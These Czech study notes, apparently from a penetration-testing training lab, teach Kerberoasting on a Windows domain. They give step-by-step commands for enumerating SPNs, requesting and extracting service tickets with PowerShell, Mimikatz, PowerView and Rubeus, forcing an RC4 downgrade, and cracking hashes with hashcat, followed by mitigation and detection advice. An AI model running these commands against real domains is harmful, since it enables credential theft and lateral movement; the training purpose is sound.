## Kerberoasting – z Windows (Semi-manuální metoda)

Před vznikem nástrojů jako Rubeus bylo kradení nebo padělání Kerberos ticketů složitým, manuálním procesem. Jak se taktika a obrana vyvíjely, můžeme nyní provádět Kerberoasting z Windows několika způsoby. Abychom se vydali touto cestou, prozkoumáme nejprve manuální postup a poté přejdeme k automatizovanějším nástrojům. Začněme s vestavěnou binárkou `setspn` pro enumeraci SPN v doméně.

### Enumerace SPN pomocí setspn.exe

DOS

```
C:\htb> setspn.exe -Q */*
```

_(Zkráceno – výstup ukazuje nalezené SPN pro různé účty v doméně INLANEFREIGHT.LOCAL, např. `MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433` pro účet `sqldev`)_

Všimneme si mnoha různých SPN vrácených pro různé hostitele v doméně. Zaměříme se na uživatelské účty a budeme ignorovat počítačové účty vrácené nástrojem. Dále můžeme pomocí PowerShellu vyžádat TGS tickety pro účet ve výše uvedeném shellu a načíst je do paměti. Jakmile jsou načteny do paměti, můžeme je extrahovat pomocí Mimikatz. Zkusme to zacílením na jednoho uživatele:

### Cílení na jednoho uživatele

PowerShell

```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Než se pohneme dál, pojďme si rozebrat výše uvedené příkazy, abychom viděli, co děláme (což je v podstatě to, co používá Rubeus při použití výchozí metody Kerberoastingu):

- Cmdlet `Add-Type` se používá k přidání třídy .NET frameworku do naší PowerShell relace, kterou pak lze instanciovat jako jakýkoli objekt .NET frameworku.
    
- Parametr `-AssemblyName` nám umožňuje specifikovat assembly, která obsahuje typy, které máme zájem použít.
    
- `System.IdentityModel` je namespace, který obsahuje různé třídy pro budování security token services.
    
- Poté použijeme cmdlet `New-Object` k vytvoření instance objektu .NET Frameworku.
    
- Použijeme namespace `System.IdentityModel.Tokens` s třídou `KerberosRequestorSecurityToken` k vytvoření security tokenu a předáme název SPN této třídě, abychom vyžádali Kerberos TGS ticket pro cílový účet v naší aktuální přihlašovací relaci (logon session).
    

Můžeme se také rozhodnout získat všechny tickety pomocí stejné metody, ale to stáhne i všechny počítačové účty, což není optimální.

### Získání všech ticketů pomocí setspn.exe

PowerShell

```
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Výše uvedený příkaz kombinuje předchozí příkaz s `setspn.exe` pro vyžádání ticketů pro všechny účty s nastaveným SPN.

Nyní, když jsou tickety načteny, můžeme použít Mimikatz k extrahování ticketu (ticketů) z paměti.

### Extrakce ticketů z paměti pomocí Mimikatz

DOS

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  
```

_(Zkráceno – výstup ukazuje extrahovaný ticket v base64 formátu pro `MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433`)_

Pokud nespecifikujeme příkaz `base64 /out:true`, Mimikatz extrahuje tickety a zapíše je do souborů `.kirbi`. V závislosti na naší pozici v síti a na tom, zda můžeme snadno přesouvat soubory na náš útočný hostitel, to může být snazší, když přejdeme k crackování ticketů. Vezměme base64 blob získaný výše a připravme ho na crackování.

Dále můžeme vzít base64 blob a odstranit nové řádky a mezery, protože výstup je zalomený do sloupců a pro další krok ho potřebujeme celý na jednom řádku.

### Příprava Base64 Blobu pro crackování

Fragment kódu

```
michal08@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
```

Tento jediný řádek výstupu můžeme umístit do souboru a převést jej zpět na soubor `.kirbi` pomocí utility `base64`.

### Umístění výstupu do souboru jako .kirbi

Fragment kódu

```
michal08@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
```

Dále můžeme použít tuto verzi nástroje `kirbi2john.py` k extrahování Kerberos ticketu ze souboru TGS.

### Extrakce Kerberos ticketu pomocí kirbi2john.py

Fragment kódu

```
michal08@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
```

Tím se vytvoří soubor s názvem `crack_file`. Poté musíme soubor trochu upravit, abychom mohli proti hashi použít Hashcat.

### Úprava crack_file pro Hashcat

Fragment kódu

```
michal08@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Nyní můžeme zkontrolovat a potvrdit, že máme hash, který lze předložit Hashcatu.

### Zobrazení připraveného hashe

Fragment kódu

```
michal08@htb[/htb]$ cat sqldev_tgs_hashcat 
$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91...
```

Poté můžeme hash spustit přes Hashcat a získat heslo v plaintexu!

### Crackování hashe pomocí Hashcatu

Fragment kódu

```
michal08@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

_(Výstup ukazuje stav `Cracked` a heslo: `database!`)_

Pokud se rozhodneme přeskočit base64 výstup v Mimikatzu a zadáme `mimikatz # kerberos::list /export`, soubor (nebo soubory) `.kirbi` budou zapsány na disk. V tomto případě si můžeme soubor(y) stáhnout a spustit na ně přímo `kirbi2john.py`, čímž přeskočíme krok base64 dekódování.

Nyní, když jsme viděli starší, manuálnější způsob provedení Kerberoastingu z Windows stroje a offline zpracování, podívejme se na některé rychlejší způsoby. Většina assessmentů je časově omezená a často potřebujeme pracovat co nejrychleji a nejefektivněji, takže výše uvedená metoda pravděpodobně nebude naším hlavním postupem pokaždé. To znamená, že může být užitečné mít v rukávu další triky a metodiky pro případ, že naše automatizované nástroje selžou nebo budou zablokovány.

## Automatizovaná cesta založená na nástrojích

Dále si probereme dva mnohem rychlejší způsoby, jak provést Kerberoasting z Windows hostitele. Nejprve použijeme PowerView k extrahování TGS ticketů a jejich převodu do formátu Hashcat. Můžeme začít enumerací SPN účtů.

### Použití PowerView k enumeraci SPN účtů

PowerShell

```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```

Odtud bychom mohli zacílit na konkrétního uživatele a získat TGS ticket ve formátu Hashcat.

### Použití PowerView k zacílení na konkrétního uživatele

PowerShell

```
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Nakonec můžeme exportovat všechny tickety do souboru CSV pro offline zpracování.

### Export všech ticketů do souboru CSV

PowerShell

```
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

K provedení Kerberoastingu ještě rychleji a snadněji můžeme použít také Rubeus z GhostPacku. Rubeus nám poskytuje celou řadu možností pro provádění Kerberoastingu.

### Použití Rubeus

Můžeme nejprve použít Rubeus k porovnání statistik. Z výstupu můžeme vidět, kolik uživatelů je Kerberoastable a jaké typy šifrování podporují.

### Použití příznaku /stats

PowerShell

```
PS C:\htb> .\Rubeus.exe kerberoast /stats
```

Použijme Rubeus k vyžádání ticketů pro účty s atributem `admincount` nastaveným na 1. To by pravděpodobně byly vysoce hodnotné cíle, které stojí za naše počáteční zaměření pro offline crackování pomocí Hashcatu. Nezapomeňte specifikovat příznak `/nowrap`, aby bylo možné hash snáze zkopírovat pro offline crackování. Podle dokumentace příznak `/nowrap` zabraňuje tomu, aby byly jakékoli base64 ticket bloby zalomeny do sloupců pro jakoukoli funkci; proto se nebudeme muset starat o ořezávání prázdných znaků nebo nových řádků před crackováním pomocí Hashcatu.

### Použití příznaku /nowrap

PowerShell

```
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## Poznámka k typům šifrování

Nástroje pro Kerberoasting obvykle vyžadují šifrování RC4 při provádění útoku a inicializaci požadavků TGS-REQ. Je to proto, že RC4 je slabší a snáze se crackuje offline pomocí nástrojů jako Hashcat než jiné šifrovací algoritmy jako AES-128 a AES-256. Při provádění Kerberoastingu ve většině prostředí získáme hashe, které začínají na `$krb5tgs$23$*`, což je ticket šifrovaný pomocí RC4 (typ 23). Někdy obdržíme hash šifrovaný pomocí AES-256 (typ 18) nebo hash, který začíná na `$krb5tgs$18$*`. I když je možné cracknout TGS tickety AES-128 (typ 17) a AES-256 (typ 18) pomocí Hashcatu, bude to obvykle výrazně časově náročnější než crackování ticketu šifrovaného pomocí RC4 (typ 23), ale stále je to možné, zejména pokud je zvoleno slabé heslo.

Příkazem v PowerView můžeme zkontrolovat atribut `msDS-SupportedEncryptionTypes`. Pokud je hodnota 0, znamená to, že specifický typ šifrování není definován a je nastaven na výchozí RC4_HMAC_MD5. Pokud je hodnota 24, znamená to, že jsou podporovány pouze typy šifrování AES 128/256.

Pro crackování AES ticketů v Hashcatu musíme použít hash mode 19700.

### Použití příznaku /tgtdeleg

Můžeme použít Rubeus s příznakem `/tgtdeleg`, abychom specifikovali, že chceme pouze šifrování RC4 při vyžádání nového service ticketu. Tímto způsobem můžeme downgradovat z AES na RC4 a zkrátit čas crackování.

_Poznámka: Toto nefunguje proti Domain Controlleru se systémem Windows Server 2019 a novějším. Vždy vrátí service ticket šifrovaný nejvyšší úrovní šifrování podporovanou cílovým účtem._

## Mitigace & Detekce

- **Silná hesla:** Důležitou mitigací pro nespravované servisní účty je nastavení dlouhého a komplexního hesla nebo passphrase. Doporučuje se však používat Managed Service Accounts (MSA) a Group Managed Service Accounts (gMSA) nebo účty nastavené pomocí LAPS.
    
- **Detekce anomálií:** Při Kerberoastingu uvidíme abnormální množství požadavků a odpovědí TGS-REQ a TGS-REP. Domain controllery mohou být konfigurovány tak, aby logovaly požadavky na Kerberos TGS tickety výběrem možnosti _Audit Kerberos Service Ticket Operations_ v rámci Group Policy.
    
- **Event ID:** To vygeneruje dvě samostatná event ID: **4769** (A Kerberos service ticket was requested) a **4770** (A Kerberos service ticket was renewed). Velké množství eventů 4769 z jednoho účtu v krátkém časovém úseku může indikovat útok. V logu můžeme vidět typ šifrování ticketu (např. 0x17, což je hexadecimální hodnota pro 23 – RC4).
    
- **Omezení algoritmů:** Mezi další kroky nápravy patří omezení použití algoritmu RC4, zejména pro požadavky Kerberos ze strany servisních účtů. Domain Admins a další vysoce privilegované účty by se neměly používat jako SPN účty.
    

## Pokračování příště

Nyní, když máme sadu (doufejme privilegovaných) přihlašovacích údajů, můžeme se posunout dále a zjistit, kde je můžeme použít:

- Přístup k hostiteli přes RDP nebo WinRM jako lokální uživatel nebo lokální admin.
    
- Autentizace k vzdálenému hostiteli jako admin pomocí nástroje jako PsExec.
    
- Získání přístupu k citlivému sdílenému souboru (file share).
    
- Získání MSSQL přístupu k hostiteli jako DBA uživatel, což lze následně využít k eskalaci privilegii.
    

# 📝 Rychlé poznámky a přehled příkazů

### 1. Manuální enumerace a vyžádání ticketů (Windows CMD/PowerShell)

- **`setspn.exe -Q */*`** – Vyhledá všechny registrované SPN v doméně. Pro účely Kerberoastingu filtrujte uživatelské účty (`CN=... ,OU=Service Accounts`), ignorujte počítačové účty.
    
- **Načtení TGS do paměti pro jednoho uživatele:**
    
    PowerShell
    
    ```
    Add-Type -AssemblyName System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
    ```
    
- **Načtení TGS pro všechny uživatele hromadně:**
    
    PowerShell
    
    ```
    setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
    ```
    

### 2. Extrakce a příprava na crackování (Mimikatz & Linux)

- **Extrakce v Mimikatz (Base64 výstup do logu):**
    
    DOS
    
    ```
    mimikatz # base64 /out:true
    mimikatz # kerberos::list /export
    ```
    
- **Vyčištění Base64 blobu (odstranění zalomení řádků):**
    
    Bash
    
    ```
    echo "<base64_blob>" | tr -d \\n
    ```
    
- **Převod vyčištěného Base64 textu zpět na soubor `.kirbi`:**
    
    Bash
    
    ```
    cat encoded_file | base64 -d > sqldev.kirbi
    ```
    
- **Konverze `.kirbi` do formátu John (`crack_file`):**
    
    Bash
    
    ```
    python2.7 kirbi2john.py sqldev.kirbi
    ```
    
- **Úprava `crack_file` pomocí `sed` do formátu pro Hashcat:**
    
    Bash
    
    ```
    sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
    ```
    

### 3. Crackování pomocí Hashcatu

- **Pro RC4 hash (etype 23):**
    
    Bash
    
    ```
    hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
    ```
    
- **Pro AES-256 hash (etype 18):**
    
    Bash
    
    ```
    hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
    ```
    

### 4. Automatizovaná cesta pomocí PowerView (PowerShell)

- **Enumerace uživatelů s SPN:**
    
    PowerShell
    
    ```
    Import-Module .\PowerView.ps1
    Get-DomainUser * -spn | select samaccountname
    ```
    
- **Získání hashe konkrétního uživatele přímo ve formátu Hashcat:**
    
    PowerShell
    
    ```
    Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
    ```
    
- **Export všech TGS hashe do CSV:**
    
    PowerShell
    
    ```
    Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
    ```
    
- **Kontrola podporovaných typů šifrování uživatele:**
    
    PowerShell
    
    ```
    Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
    ```
    
    _(0 = default RC4, 24 = pouze AES-128/256)_
    

### 5. Automatizovaná cesta pomocí Rubeus (PowerShell)

- **Zobrazení statistik (počet Kerberoastable účtů a šifrování bez vyžádání ticketu):**
    
    PowerShell
    
    ```
    .\Rubeus.exe kerberoast /stats
    ```
    
- **Cílený Kerberoasting vysoce privilegovaných účtů (admincount=1) bez zalomení řádků (`/nowrap`):**
    
    PowerShell
    
    ```
    .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
    ```
    
- **Pokus o vynucení downgradu z AES na RC4 šifrování (nefunguje na Server 2019+):**
    
    PowerShell
    
    ```
    .\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
    ```